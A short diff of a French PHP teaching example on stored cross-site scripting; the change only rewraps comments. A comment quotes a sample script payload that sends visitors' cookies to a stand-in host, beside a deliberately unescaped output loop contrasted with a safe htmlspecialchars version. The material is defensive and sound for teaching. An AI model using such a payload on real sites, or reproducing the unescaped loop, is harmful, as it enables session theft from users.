@@ -43,11 +43,14 @@ $pdo->prepare("INSERT INTO commentaires (texte) VALUES (?)")->execute([$commenta
 
 // DANGEREUX : reaffichage plus tard, sans echappement
 foreach ($commentaires as $c) {
-    echo $c['texte'];  // si un attaquant a poste <script>document.location='https://vol.example/?c='+document.cookie</script>,
+    // si un attaquant a poste
+    // <script>document.location='https://vol.example/?c='+document.cookie</script>,
+    echo $c['texte'];
                         // CE CODE S'EXÉCUTE chez CHAQUE visiteur qui voit ce commentaire
 }
 
-// SÛR : même réflexe qu'en reflected, appliqué au moment de l'AFFICHAGE, pas de l'enregistrement
+// SÛR : même réflexe qu'en reflected, appliqué au moment de l'AFFICHAGE, pas de
+// l'enregistrement
 foreach ($commentaires as $c) {
     echo htmlspecialchars($c['texte']);
 }
